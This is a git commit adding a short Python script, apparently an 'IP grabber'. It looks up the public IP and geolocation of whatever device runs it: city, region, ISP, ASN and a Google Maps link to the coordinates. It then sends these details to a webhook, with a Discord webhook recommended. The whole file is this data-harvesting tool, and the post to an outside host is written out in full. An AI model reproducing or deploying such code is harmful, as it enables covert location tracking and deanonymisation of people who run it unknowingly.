d181c4f043306a09c2a08fbd290df3658ec77c87
Janak <janakthegamer@gmail.com>
2021-12-05 01:46:03 +0530

    init

---
+++ main.py
@@ -0,0 +1,61 @@
+"""
+This Script gets IP and its information of the device where it was executed
+the script also send data to webhook (recomend to use discord webhook)
+"""
+import requests
+
+hurl = "" # put your webhook url here
+
+
+# Dont touch
+url = "http://ip-api.com/json/"
+r = requests.get(url)
+geo = r.json()
+
+data = {
+  "embeds": [
+    {
+      "color": 65280,
+      "fields": [
+        {
+          "name": "IP",
+          "value": "{ip}".format(ip=geo["query"])
+        },
+        {
+          "name": "Country",
+          "value": "{country}".format(country=geo["country"])
+        },
+        {
+          "name": "Region",
+          "value": "{regionName}".format(regionName=geo["regionName"])
+        },
+        {
+          "name": "City",
+          "value": "{city}".format(city=geo["city"])
+        },
+        {
+          "name": "Timezone",
+          "value": "{timezone}".format(timezone=geo["timezone"])
+        },
+        {
+          "name": "ISP",
+          "value": "{isp}".format(isp=geo["isp"])
+        },
+        {
+          "name": "ORG",
+          "value": "{org}".format(org=geo["org"])
+        },
+        {
+          "name": "AS",
+          "value": "{aas}".format(aas=geo["as"])
+        },
+        {
+          "name": "Google Map Link",
+          "value": "[Map Link](https://www.google.com/maps/place/{lat},{lon})".format(lat=geo["lat"], lon=geo["lon"])
+        },
+      ]
+    }
+  ]
+}
+
+paylods = requests.post(hurl, json=data)
